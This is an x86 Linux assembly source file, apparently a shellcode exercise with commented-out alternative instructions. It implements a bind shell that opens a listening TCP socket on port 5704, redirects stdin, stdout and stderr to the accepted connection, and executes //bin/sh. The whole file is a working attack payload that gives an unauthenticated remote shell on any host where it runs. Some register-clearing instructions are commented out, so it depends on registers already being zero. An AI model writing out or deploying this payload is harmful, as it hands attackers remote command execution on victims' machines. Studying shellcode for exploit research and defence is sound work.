global _start

section .text

_start:
	
	xor eax,eax			;; Cleanup Registers
;	xor ebx,ebx			;; Cleanup Registers
;	xor ecx,ecx			;; Cleanup Registers
;	xor edx,edx			;; Cleanup Registers

	push eax
	mov al,0x66
	
;	push BYTE 0x66
;	pop eax

	push BYTE 0x1
	pop ebx

;	mov al,0x66			;; Syscall # for socketcall
;	mov bl,0x1			;; Socketcall # for SYS_SOCKET
;	push edx			;; Push null bytes for protocol
	push ebx			;; Push 1 for SOCKET_STREAM
	push BYTE 0x2		;; Push 2 for AF_INET
	mov ecx,esp			;; Store ptr to args array
	int 0x80			;; Syscall interrupt, as in socket(AF_INET, SOCK_STREAM, 0)

;	mov esi,eax			;; Store socket_fd in esi
	
	xchg esi, eax
	
	push edx			;; Push null bytes for INADDR_ANY
	push WORD 0x4816	;; Push port number, in network byte order, as in 5704 (0x1648) becomes 0x4816
	push WORD 0x2		;; Push 2 for AF_INET
	mov ecx,esp			;; Store ptr to args array
	push 0x10			;; Push 16 for sizeof sockaddr struct
	push ecx			;; Push ptr to sockaddr struct
	push esi			;; Push socket_fd
	mov al,0x66			;; Syscall # for socketcall

;	mov bl,0x2			;; Socketcall # for SYS_BIND

	inc ebx

	mov ecx,esp			;; Store ptr to args array
	int 0x80			;; Syscall interrupt, as in bind(socket_fd, (*)&sockaddr, sizeof(sockaddr))

;	push edx			;; Push null bytes for arguments terminator
	push edx			;; Push null bytes for backlog
	push esi			;; Push socket_fd
;	xor eax,eax			;; Clear eax
	mov al,0x66			;; Syscall # for socketcall
	mov bl,0x4			;; Socketcall # for SYS_LISTEN
	mov ecx,esp			;; Store ptr to args array
	int 0x80			;; Syscall interrupt, as in listen(socket_fd, 0);

;	push edx			;; Push null bytes for arguments terminator
	push edx			;; Push null bytes for client sockaddr struct
	push esi			;; Push socket_fd
	mov ecx,esp			;; Store ptr to args array
	mov al,0x66			;; Syscall # for socketcall

	inc ebx

;	mov bl,0x5			;; Socketcall # for SYS_ACCEPT
	int 0x80			;; Syscall interrupt, as in accept(socket_fd, NULL, NULL)

	mov esi,eax			;; Store conn_fd in esi
;	xchg esi,eax
;	xor eax,eax			;; Clear eax
	xor ecx,ecx			;; Clear ecx
	mov cl,0x3			;; Store loop counter for DUP2 calls
	mov ebx,esi
DUP2s:
	mov al,0x3f			;; Syscall # for dup2
	dec ecx				;; Decrement counter value representing new_fd
	int 0x80			;; Syscall interrupt, as in dup2(conn_fd, [2, 1, 0])
	jnz DUP2s			;; Looping from [3-1, 2-1, 1-1]
	
	push edx			;; Push null bytes for envp
;	mov edx,esp			;; Store ptr to envp
	mov ecx, esp		;; Store ptr to argv
	push 0x68732f6e		;; Push bytes for //bin/sh (hs/n)
	push 0x69622f2f		;; Push bytes for //bin/sh (ib//)
	mov ebx,esp			;; Store ptr to filename
;	xor eax,eax			;; Clear eax
	mov al,0xb			;; Syscall # for execve
	int 0x80			;; Syscall interrupt, as in execve("//bin/sh", NULL, NULL)
